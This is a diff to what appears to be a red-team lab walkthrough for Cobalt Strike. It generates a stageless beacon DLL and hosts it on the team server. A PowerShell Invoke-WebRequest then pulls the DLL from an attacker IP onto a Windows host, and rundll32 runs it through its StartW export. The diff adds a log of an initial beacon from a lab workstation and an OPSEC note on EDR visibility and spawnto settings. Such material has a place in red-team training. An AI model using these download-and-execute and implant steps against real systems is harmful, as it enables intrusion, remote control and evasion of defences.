@@ -48,10 +48,10 @@ icacls C:\Windows\Temp
 ## Step 2 — Generate Stageless Beacon DLL (Attacker Desktop — CS)
 
 ```
-Attacks > Packages > Windows Stageless Payload
+Cobalt Strike > Payloads > Windows Stageless Payload
   Listener:  http
   Output:    Windows DLL (x64)
-  Save as:   beacon.dll
+  Save as:   C:\Payloads\beacon.dll
 ```
 
 ---
@@ -65,7 +65,13 @@ Site Management > Host File
   Port:   80
 ```
 
-CS confirms: `hosted file /beacon.dll @ http://10.0.0.5:80/beacon.dll`
+CS confirms: 
+
+```
+04/21 08:09:23 *** neo hosted file /cobaltstrike/server/uploads/beacon.dll @ http://172.16.0.10:80/beacon.dll
+04/21 08:10:29 *** initial beacon from pchilds@10.10.121.108 (LON-WKSTN-1)
+```  
+
 
 ---
 
@@ -85,7 +91,7 @@ Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Task
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
-> **OPSEC-CAUTION:** `rundll32` is EDR-visible. Beacon DLL exports `StartW` specifically for this call. Ensure `spawnto` is set in the malleable profile before generating the payload.
+> **OPSEC-🟠CAUTION:** `rundll32` is EDR-visible. Beacon DLL exports `StartW` specifically for this call. Ensure `spawnto` is set in the malleable profile before generating the payload.
 
 ---
 
